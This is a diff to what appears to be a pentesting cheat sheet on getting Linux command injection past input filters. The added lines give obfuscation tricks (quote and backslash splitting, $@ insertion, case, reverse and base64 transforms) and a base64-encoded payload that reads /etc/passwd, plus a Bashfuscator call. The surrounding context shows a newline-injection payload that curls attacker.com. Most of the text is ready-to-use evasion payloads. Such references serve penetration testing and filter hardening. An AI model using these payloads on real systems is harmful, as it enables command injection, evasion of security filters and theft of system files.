@@ -55,14 +55,26 @@ ls *
 # [chars]
 /usr/bin/n[c] # /usr/bin/nc
 
-# Quotes / Concatenation
+# Quotes
 'p'i'n'g # ping
 "w"h"o"a"m"i # whoami
-\u\n\a\m\e \-\a # uname -a
 ech''o test # echo test
 ech""o test # echo test
 bas''e64 # base64
+
+#Backslashes
+\u\n\a\m\e \-\a # uname -a
 /\b\i\n/////s\h
+
+# $@
+who$@ami #whoami
+
+# Transformations (case, reverse, base64)
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
+$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
+$(rev<<<'imaohw') #whoami
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64
+
 
 # Execution through $0
 echo whoami|$0
@@ -122,6 +134,12 @@ uname!-1\-a # This equals to uname -a
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+```
+
+### Bypass pipes
+
+```bash
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
 
 ### Bypass with hex encoding
@@ -217,6 +235,13 @@ declare historywords
 ```bash
 # A regex that only allow letters and numbers migth be vulnerable to new line characters
 1%0a`curl http://attacker.com`
+```
+
+### Bashfuscator
+
+```bash
+# From https://github.com/Bashfuscator/Bashfuscator
+./bashfuscator -c 'cat /etc/passwd'
 ```
 
 ### RCE with 5 chars
